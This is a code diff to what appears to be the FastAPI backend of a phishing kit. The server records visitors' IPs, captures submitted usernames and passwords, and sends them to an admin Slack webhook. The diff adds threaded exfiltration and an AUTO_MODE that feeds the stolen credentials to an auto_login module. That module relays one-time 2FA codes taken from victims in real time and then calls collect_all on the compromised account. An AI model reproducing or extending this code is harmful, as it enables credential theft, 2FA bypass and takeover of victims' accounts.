@@ -19,10 +19,15 @@ import requests
 import time
 import os
 from fastapi.security import APIKeyHeader
+from utils import messageAdmin, CONFIG, logger
+
+# import modules.auto_login
+from modules.auto_login import auto_login
+import threading
+from queue import Queue
 
 
-with open("./config.json", "r") as f:
-    CONFIG = json.load(f)
+AUTO_MODE = True
 
 api_key_header = APIKeyHeader(name="X-API-Key")
 
@@ -47,11 +52,6 @@ def get_db():
         yield db
     finally:
         db.close()
-
-
-logger = logging.getLogger("uvicorn")
-logger.setLevel(logging.INFO)
-logger.addHandler(logging.StreamHandler())
 
 
 def get_api_key(api_key_header: str = Security(api_key_header)) -> str:
@@ -83,17 +83,6 @@ class ConnectionManager:
 manager = ConnectionManager()
 
 
-def messageAdmin(admin_message):
-    try:
-        r = requests.post(
-            CONFIG["SLACK_URL"],
-            json={"text": f"{admin_message}"},
-            # headers={"Content-type": "application/json"},
-        )
-    except:
-        pass
-
-
 @app.get("/")
 async def read_root(
     request: Request, user_agent: Annotated[str | None, Header()] = None
@@ -117,7 +106,9 @@ async def create_lovelyclient(
     await manager.broadcast(json.dumps(broadcast_msg))
     # TODO: alet admin
     admin_message = f"----\n New lovely customer: \n ip:{ip} \n id: {id} \n----"
-    messageAdmin(admin_message)
+    # messageAdmin(admin_message)
+    messageadmin_thread = threading.Thread(target=messageAdmin, args=(admin_message,))
+    messageadmin_thread.start()
     # await manager
     # return to client success
     return id
@@ -135,9 +126,56 @@ def login(
         return '{"status":"Error"}'
 
     admin_message = f"----\n Creds: \n id: {id}\n username:{item.username}\n password:{item.password} \n----"
-    messageAdmin(admin_message)
+    # messageAdmin(admin_message)
+    messageadmin_thread = threading.Thread(target=messageAdmin, args=(admin_message,))
+    messageadmin_thread.start()
 
+    if AUTO_MODE:
+        q = Queue()
+        auto_func = threading.Thread(
+            target=auto_mode_func,
+            args=(
+                q,
+                id,
+                item.username,
+                item.password,
+            ),
+        )
+        auto_func_listner = threading.Thread(
+            target=auto_mode_func_listner,
+            args=(
+                q,
+                request,
+                id,
+            ),
+        )
+        auto_func_listner.start()
+        auto_func.start()
+        # auto_mode = modules.auto_login(id, item.username, item.password)
+        # auto_mode.collect_all()
     return '{"status":"OK"}'
+
+
+def auto_mode_func_listner(q, request, id):
+    while True:
+        curr_msg = q.get()
+        if curr_msg == None:
+            continue
+        curr_stat = json.loads(curr_msg)
+        print(f"[+] current stat is : {curr_stat}")
+        if curr_stat["msg"] == "OTP_code":
+            set_OPT_abstracted(id=id, OTP=curr_stat["data"])
+            set_action_abstracted(id=id, action="OTP")
+
+
+def auto_mode_func(q, id, username, password):
+    # while True
+    id = str(id)
+    auto_mode = auto_login(q, id, username, password)
+    login_return = json.loads(auto_mode.login())
+    if login_return["msg"] != "OTP_timeout":
+        auto_mode.collect_all()
+    time.sleep(300)  # DEBUG
 
 
 @app.get("/action/{id}")
@@ -152,6 +190,15 @@ def get_action(
     return json.dumps({"action": res})
 
 
+def set_action_abstracted(id, action):
+    db: Session = next(get_db())
+    db_user = crud.set_action(db, id, action)
+    if not db_user:
+        return '{"status":"Error"}'
+
+    return '{"status":"OK"}'
+
+
 @app.put("/action/{id}/{action}")
 def set_action(
     id: int,
@@ -159,11 +206,7 @@ def set_action(
     request: Request,
     db: Session = Depends(get_db),
 ):
-    db_user = crud.set_action(db, id, action)
-    if not db_user:
-        return '{"status":"Error"}'
-
-    return '{"status":"OK"}'
+    return set_action_abstracted(id, action)
 
 
 @app.get("/OTP/{id}")
@@ -178,6 +221,15 @@ def get_OTP(
     return json.dumps({"data": curr_OTP})
 
 
+def set_OPT_abstracted(id, OTP):
+    db: Session = next(get_db())
+    db_user = crud.set_OTP(db, id, OTP)
+    if not db_user:
+        return '{"status":"Error"}'
+
+    return '{"status":"OK"}'
+
+
 @app.put("/OTP/{id}/{OTP}")
 def set_OTP(
     id: int,
@@ -185,11 +237,7 @@ def set_OTP(
     request: Request,
     db: Session = Depends(get_db),
 ):
-    db_user = crud.set_OTP(db, id, OTP)
-    if not db_user:
-        return '{"status":"Error"}'
-
-    return '{"status":"OK"}'
+    return set_OPT_abstracted(id, OTP)
 
 
 # future feature
